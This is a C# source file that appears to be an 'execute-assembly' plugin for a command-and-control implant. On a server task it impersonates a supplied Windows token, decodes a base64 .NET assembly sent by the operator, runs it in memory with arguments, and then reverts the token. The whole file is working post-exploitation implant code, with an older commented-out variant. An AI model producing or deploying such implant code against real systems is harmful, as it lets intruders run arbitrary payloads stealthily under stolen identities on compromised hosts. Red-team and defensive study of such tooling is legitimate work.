using Agent.Interfaces;
using Agent.Models;
using System.Text.Json;
using Agent.Utilities;
namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "execute-assembly";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private List<ConsoleApplicationExecutor> Executors { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            ExecuteAssemblyArgs args = JsonSerializer.Deserialize<ExecuteAssemblyArgs>(job.task.parameters);

            if (!args.Validate())
            {
                messageManager.Write("Missing Assembly Bytes", job.task.id, true, "error");
                return;
            }

            ConsoleApplicationExecutor cae = new ConsoleApplicationExecutor(Misc.Base64DecodeToByteArray(args.asm), Misc.SplitCommandLine(args.arguments), job.task.id);
            cae.ExecuteConsoleApplication();

            //try
            //{
            //    if (args.path != null)
            //    {
            //        string output = Misc.ExecuteAssembly(args.path, args.parameters, job.task.id);
            //        messageManager.Write(output, job.task.id, true);
            //    }
            //    else
            //    {
            //        messageManager.Write("Missing path parameter", job.task.id, true, "error");
            //    }
            //}
            //catch (Exception e)
            //{
            //    messageManager.Write(e.ToString(), job.task.id, true, "error");
            //}

            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
    }
}
